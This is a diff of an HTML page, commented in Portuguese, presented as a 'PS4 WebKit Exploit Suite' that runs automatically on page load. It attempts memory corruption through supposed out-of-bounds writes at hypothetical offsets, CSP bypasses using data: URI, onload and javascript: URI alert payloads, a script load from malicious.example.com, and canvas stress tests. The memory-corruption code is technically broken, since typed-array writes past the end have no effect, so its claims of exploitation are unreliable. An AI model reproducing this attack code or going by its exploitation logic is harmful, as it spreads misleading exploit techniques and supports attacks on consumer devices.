@@ -3,15 +3,15 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Combined Privilege Escalation POC (Modificado)</title>
+    <title>PS4 WebKit Exploit Suite</title>
 </head>
 
 <body>
-    <h1>PS4 WebKit Combined Privilege Escalation POC (Modificado)</h1>
+    <h1>PS4 WebKit Exploit Suite</h1>
     <div id="output"></div>
 
     <script>
-        // Funções auxiliares para logging e manipulação de memória
+        // === Funções Auxiliares ===
         const log = (message, type = 'info') => {
             const outputDiv = document.getElementById('output');
             let color = 'black';
@@ -36,111 +36,141 @@
 
         const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-        // ====================== Funções de Exploração ======================
+        // === Exploração de Memória ===
 
-        // 1. OOB Write Elaborado (com Corrupção de Metadados - Conceito)
-        const oobMetadataCorruption = async () => {
-            log("\n--- Estágio 6: OOB Write com Corrupção de Metadados ---", 'critical');
-
+        // 1. OOB Write (Genérico)
+        const genericOobWrite = (buffer, offset, value, size) => {
             try {
-                const bufferSize = 64;
-                const buffer = new ArrayBuffer(bufferSize);
                 const view = new Uint8Array(buffer);
-
-                let targetObject = {
-                    prop1: 1,
-                    prop2: "hello",
-                    prop3: [1, 2, 3]
-                };
-
-                // **IMPORTANTE:** Os offsets aqui são apenas para demonstração.
-                // Você precisará analisar o layout da memória do WebKit para encontrar os offsets corretos.
-                const butterflyOffset = 40; // Offset hipotético para o butterfly
-                const structureIdOffset = 56; // Offset hipotético para o structure ID
-
-                // Função para realizar a escrita OOB
-                const oobWrite = (offset, value, size) => {
-                    for (let i = 0; i < size; i++) {
-                        view[offset + i] = (value >> (i * 8)) & 0xFF;
-                    }
-                };
-
-                // Corromper o butterfly (exemplo)
-                const butterflyValue = 0x41424344; // Valor hipotético
-                oobWrite(butterflyOffset, butterflyValue, 4);
-                log(`Tentativa de corromper o butterfly no offset ${butterflyOffset} com valor ${hex(butterflyValue)}`, 'warning');
-
-                // Corromper o structure ID (exemplo)
-                const structureIdValue = 0x12345678; // Valor hipotético
-                oobWrite(structureIdOffset, structureIdValue, 4);
-                log(`Tentativa de corromper o structure ID no offset ${structureIdOffset} com valor ${hex(structureIdValue)}`, 'warning');
-
-                // Aguardar um curto período para a escrita ter efeito
-                await sleep(500);
-
-                // Tentar acessar propriedades do objeto após a corrupção
-                try {
-                    log(`targetObject.prop1: ${targetObject.prop1}`, 'info');
-                    log(`targetObject.prop4: ${targetObject.prop4}`, 'info'); // Tentar acessar uma propriedade inexistente (pode causar erro)
-                } catch (e) {
-                    log(`Erro ao acessar propriedades: ${e}`, 'error');
+                for (let i = 0; i < size; i++) {
+                    view[offset + i] = (value >> (i * 8)) & 0xFF;
                 }
-
-                log("Teste de OOB Write com Corrupção de Metadados concluído. Analise os logs e o comportamento do navegador.", 'success');
-
+                log(`OOB Write: Escrito ${hex(value)} no offset ${offset} (tamanho ${size})`, 'info');
             } catch (e) {
-                log(`Erro em oobMetadataCorruption: ${e}`, 'error');
+                log(`Erro em genericOobWrite: ${e}`, 'error');
             }
         };
 
-        // 2. Corrupção de ArrayBuffer Elaborado (Conceito)
-        const oobArrayBufferCorruption = async () => {
-            log("\n--- Estágio 7: Corrupção de ArrayBuffer Elaborado ---", 'critical');
-
+        // 2. Corrupção de Objeto (com OOB)
+        const corruptObjectProperty = async (targetObject, propertyName, newValue) => {
+            log(`\n--- Tentando corromper ${propertyName} em objeto ---`, 'critical');
             try {
-                const bufferSize = 64;
-                const buffer = new ArrayBuffer(bufferSize);
-                const view = new Uint32Array(buffer); // Usando Uint32Array para manipulação mais fácil de ponteiros
+                // **IMPORTANTE:** Obter o offset da propriedade requer análise de memória.
+                // Isso é apenas um exemplo.
+                const propertyOffset = 0x20; // Offset hipotético
+                const propertySize = 4; // Tamanho hipotético
 
-                // **IMPORTANTE:** Esses offsets e valores são hipotéticos.
-                // A localização exata de ponteiros e outros dados exigirá análise do WebKit.
-                const pointerOffset = 8; // Offset hipotético para um ponteiro
-                const fakeAddress = 0x1000; // Endereço falso para demonstrar a corrupção
-
-                // Função para realizar a escrita OOB
-                const oobWrite = (offset, value, size) => {
-                    for (let i = 0; i < size; i++) {
-                        view[offset + i] = (value >> (i * 8)) & 0xFF;
-                    }
-                };
-
-                // Corromper um ponteiro (exemplo)
-                oobWrite(pointerOffset, fakeAddress, 4);
-                log(`Tentativa de corromper o ponteiro no offset ${pointerOffset} com endereço falso ${hex(fakeAddress)}`, 'warning');
+                // Criar um ArrayBuffer para realizar a escrita OOB
+                const buffer = new ArrayBuffer(64); // Tamanho arbitrário
+                genericOobWrite(buffer, propertyOffset, newValue, propertySize);
 
                 await sleep(500);
 
-                // Tentar ler ou escrever no endereço falso (isso provavelmente causará um erro ou travamento)
                 try {
-                    // Simulação de leitura (muito perigoso!)
-                    //const fakeValue = view[fakeAddress / 4]; // Dividindo por 4 porque é Uint32Array
-                    //log(`Valor lido do endereço falso: ${hex(fakeValue)}`, 'info');
-                    log("Tentativa de leitura do endereço falso (desativada por segurança)", 'warning');
+                    log(`${propertyName} antes: ${targetObject[propertyName]}`, 'info');
+                    targetObject[propertyName] = newValue; // Isso pode falhar se a corrupção for bem-sucedida
+                    log(`${propertyName} depois: ${targetObject[propertyName]}`, 'success');
+
                 } catch (e) {
-                    log(`Erro ao tentar ler do endereço falso: ${e}`, 'error');
+                    log(`Erro ao acessar a propriedade: ${e}`, 'error');
                 }
 
-                log("Teste de Corrupção de ArrayBuffer Elaborado concluído. Analise os resultados com cuidado.", 'success');
-
             } catch (e) {
-                log(`Erro em oobArrayBufferCorruption: ${e}`, 'error');
+                log(`Erro em corruptObjectProperty: ${e}`, 'error');
             }
         };
 
-        // 3. Canvas Elaborado (Exemplo Básico)
-        const canvasExploration = async () => {
-            log("\n--- Estágio 8: Canvas Elaborado ---", 'critical');
+        // 3. Corrupção de ArrayBuffer (com OOB)
+        const corruptArrayBuffer = async (arrayBuffer, targetOffset, newValue, valueSize) => {
+            log('\n--- Tentando corromper ArrayBuffer ---', 'critical');
+            try {
+                genericOobWrite(arrayBuffer, targetOffset, newValue, valueSize);
+                await sleep(500);
 
+                const view = new Uint8Array(arrayBuffer);
+                let readValue = 0;
+                for (let i = 0; i < valueSize; i++) {
+                    readValue |= view[targetOffset + i] << (i * 8);
+                }
+                log(`Valor lido do ArrayBuffer: ${hex(readValue)}`, 'success');
+
+            } catch (e) {
+                log(`Erro em corruptArrayBuffer: ${e}`, 'error');
+            }
+        };
+
+        // === Bypass de CSP ===
+
+        // 4. Bypass via data: URI
+        const bypassCSPWithDataURI = () => {
+            log('\n--- Tentando Bypass de CSP via data: URI ---', 'critical');
+            try {
+                const script = document.createElement('script');
+                script.src = 'data:text/javascript;base64,YWxlcnQoJ0NQIFB5cGFzczogZGF0YTpVUkknKTs='; // alert('CSP Bypass: data:URI');
+                script.onload = () => log('Bypass de CSP via data: URI BEM-SUCEDIDO!', 'success');
+                script.onerror = () => log('Falha no Bypass de CSP via data: URI', 'error');
+                document.body.appendChild(script);
+            } catch (e) {
+                log(`Erro em bypassCSPWithDataURI: ${e}`, 'error');
+            }
+        };
+
+        // 5. Bypass via atributo onload
+        const bypassCSPWithOnload = () => {
+            log('\n--- Tentando Bypass de CSP via atributo onload ---', 'critical');
+            try {
+                const img = document.createElement('img');
+                img.setAttribute('onload', 'alert(\'CSP Bypass: onload\');');
+                img.src = 'invalid-image.jpg'; // Forçar erro para disparar onload
+                document.body.appendChild(img);
+            } catch (e) {
+                log(`Erro em bypassCSPWithOnload: ${e}`, 'error');
+            }
+        };
+
+        // 6. Bypass via javascript: URI (Requer Interação do Usuário)
+        const bypassCSPWithJavascriptURI = () => {
+            log('\n--- Tentando Bypass de CSP via javascript: URI ---', 'critical');
+            try {
+                const a = document.createElement('a');
+                a.href = 'javascript:alert(\'CSP Bypass: javascript:URI\');';
+                a.textContent = 'Clique para Bypass de CSP';
+                document.body.appendChild(a);
+                log('Lembre-se de clicar no link para executar o bypass.', 'warning');
+            } catch (e) {
+                log(`Erro em bypassCSPWithJavascriptURI: ${e}`, 'error');
+            }
+        };
+
+        // === Exploração do Canvas ===
+
+        // 7. Canvas: Leitura de Pixels
+        const canvasPixelRead = async () => {
+            log('\n--- Testando Canvas: Leitura de Pixels ---', 'critical');
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 16;
+                canvas.height = 16;
+                document.body.appendChild(canvas);
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = 'blue';
+                ctx.fillRect(0, 0, 16, 16);
+
+                await sleep(500);
+
+                const imageData = ctx.getImageData(0, 0, 1, 1);
+                log(`Cor do pixel (0,0): ${imageData.data[0]}, ${imageData.data[1]}, ${imageData.data[2]}, ${imageData.data[3]}`, 'info');
+
+                // Adicione aqui testes para ler outros pixels ou manipular os dados.
+
+            } catch (e) {
+                log(`Erro em canvasPixelRead: ${e}`, 'error');
+            }
+        };
+
+        // 8. Canvas: Excesso de Desenho
+        const canvasExcessiveDraw = async () => {
+            log('\n--- Testando Canvas: Excesso de Desenho ---', 'critical');
             try {
                 const canvas = document.createElement('canvas');
                 canvas.width = 512;
@@ -148,102 +178,71 @@
                 document.body.appendChild(canvas);
                 const ctx = canvas.getContext('2d');
 
-                // Exemplo: Desenhar um retângulo com tamanho extremo
-                ctx.fillStyle = 'red';
-                ctx.fillRect(0, 0, canvas.width * 2, canvas.height * 2); // Tamanho maior que o canvas
+                ctx.fillStyle = 'green';
+                for (let i = 0; i < 1000; i++) {
+                    ctx.fillRect(Math.random() * 512, Math.random() * 512, 10, 10);
+                }
+                log('1000 retângulos desenhados.', 'info');
 
-                // Aguardar um pouco
-                await sleep(500);
+                // Teste se isso causa lentidão, travamento ou outros comportamentos inesperados.
 
-                // Exemplo: Obter dados do Canvas
-                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-                log(`Dados do Canvas obtidos: ${imageData.data.length} bytes`, 'info');
-
-                // Aqui você pode adicionar mais testes para manipulação de pixels, WebGL, etc.
-
-                log("Teste de Canvas Elaborado concluído. Inspecione o Canvas e os dados obtidos.", 'success');
+                await sleep(1000);
 
             } catch (e) {
-                log(`Erro em canvasExploration: ${e}`, 'error');
+                log(`Erro em canvasExcessiveDraw: ${e}`, 'error');
             }
         };
 
-        // ====================== Exploit Combinado ======================
+        // === Sequência de Exploração ===
 
-        async function triggerCombinedExploit() {
-            log("<h2>Iniciando PoC Combinada de Escalada de Privilégios (Modificada)...</h2>");
+        async function runExploits() {
+            log('<h2>Iniciando Suíte de Exploração WebKit</h2>');
 
-            // ====================== Passo 1: Tentativa de OOB Write para Corrupção ======================
-            log("<p><strong>Passo 1: Tentando OOB Write para Corromper Memória relacionada ao CSP...</strong></p>");
+            // === OOB Write Inicial (CSP) ===
+            log('\n=== 1. OOB Write para Corromper CSP ===', 'critical');
             try {
-                const bufferSize = 64; // Aumentando o tamanho para mais flexibilidade
+                const bufferSize = 64;
                 const buffer = new ArrayBuffer(bufferSize);
-                const view = new Uint8Array(buffer);
-                const writeOffset = 70; // Tentando escrever alguns bytes após o buffer
-                const writeValue = 0x00; // Escrevendo zeros para tentar sobrescrever flags ou contadores
+                genericOobWrite(buffer, 70, 0, 1); // Offset e valor hipotéticos
+                await sleep(1000);
 
-                view[writeOffset] = writeValue;
-                log(`<p>Tentativa de escrita de ${hex(writeValue)} no offset ${writeOffset} (fora dos limites).</p>`);
-
-                // Pequeno delay para a escrita ocorrer
-                await sleep(500);
-
-                log("<p><strong>Verificando se a OOB Write teve algum efeito (indireto)...</strong></p>");
-                // Aqui, poderíamos tentar acionar algum comportamento que seria afetado por uma corrupção relacionada ao CSP,
-                // como tentar carregar um script de uma fonte que deveria ser bloqueada.
+                // Teste indireto do efeito no CSP (como no script original)
                 const testScript = document.createElement('script');
-                testScript.src = 'http://malicious.example.com/should_be_blocked.js';
-                testScript.onload = function() {
-                    log("<strong style='color: red;'>FALHA NA SEGURANÇA! Script de fonte bloqueada carregou (possível corrupção de CSP via OOB Write).</strong>", 'error');
-                    // Se isso acontecer, a escalada de privilégios é significativa.
-                };
-                testScript.onerror = function() {
-                    log("Script de fonte bloqueada NÃO carregou (comportamento esperado do CSP).", 'info');
-                };
+                testScript.src = 'http://malicious.example.com/blocked.js';
+                testScript.onload = () => log('FALHA! CSP corrompido.', 'error');
+                testScript.onerror = () => log('CSP parece OK.', 'info');
                 document.body.appendChild(testScript);
-
-                // Limpar o script para não interferir em testes futuros
                 setTimeout(() => document.body.removeChild(testScript), 2000);
 
-            } catch (error) {
-                log(`<strong style='color: orange;'>Erro durante a tentativa de OOB Write:</strong> ${error.message}`, 'warning');
+            } catch (e) {
+                log(`Erro em OOB Write (CSP): ${e}`, 'error');
             }
 
-            await sleep(2000); // Mais um delay
+            // === Bypass de CSP ===
+            log('\n=== 2. Bypass de CSP ===', 'critical');
+            bypassCSPWithDataURI();
+            bypassCSPWithOnload();
+            bypassCSPWithJavascriptURI(); // Requer interação
 
-            // ====================== Passo 2: Tentativa de Bypass de CSP ======================
-            log("<p><strong>Passo 2: Tentando Bypass de CSP via data: URI...</strong></p>");
-            const scriptBypass = document.createElement('script');
-            scriptBypass.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gYmF5cGFzcyBjb21ib28hJyk7'; // alert('Vupun bypass combo!');
-            scriptBypass.onload = function() {
-                log("<strong style='color: green;'>Bypass de CSP via data: URI BEM-SUCEDIDO! (Mesmo após a tentativa de OOB Write).</strong>", 'success');
-                // Se chegarmos aqui, mesmo que a OOB Write não tenha escalado privilégios diretamente,
-                // ainda temos execução de código arbitrário via bypass de CSP.
-            };
-            scriptBypass.onerror = function() {
-                log("<strong style='color: orange;'>Falha ao bypassar o CSP via data: URI.</strong>", 'warning');
-            };
-            document.body.appendChild(scriptBypass);
+            await sleep(3000); // Dar tempo para os bypasses
 
-            await sleep(2000);
+            // === Corrupção de Memória ===
+            log('\n=== 3. Corrupção de Memória ===', 'critical');
+            let testObject = { vulnerableProp: 'original' };
+            await corruptObjectProperty(testObject, 'vulnerableProp', 0x1337);
 
-            log("<p><strong>Tentando Bypass de CSP via atributo onload (em img)...</strong></p>");
-            const imgBypass = document.createElement('img');
-            imgBypass.setAttribute('onload', 'alert(\'Vupun bypass combo onload!\');');
-            imgBypass.src = 'invalid-image.jpg';
-            document.body.appendChild(imgBypass);
+            let testArrayBuffer = new ArrayBuffer(32);
+            await corruptArrayBuffer(testArrayBuffer, 8, 0xdeadbeef, 4);
 
-            await sleep(2000);
+            // === Exploração do Canvas ===
+            log('\n=== 4. Exploração do Canvas ===', 'critical');
+            await canvasPixelRead();
+            await canvasExcessiveDraw();
 
-            // ====================== Chamada das novas explorações ======================
-            await oobMetadataCorruption();
-            await oobArrayBufferCorruption();
-            await canvasExploration();
-
-            log("<p><strong>Testes combinados concluídos. Verifique os alertas e a saída.</strong></p>");
+            log('\n<h3>Suíte de Exploração Concluída.</h3>', 'success');
         }
 
-        document.addEventListener('DOMContentLoaded', triggerCombinedExploit);
+        document.addEventListener('DOMContentLoaded', runExploits);
     </script>
 </body>
 
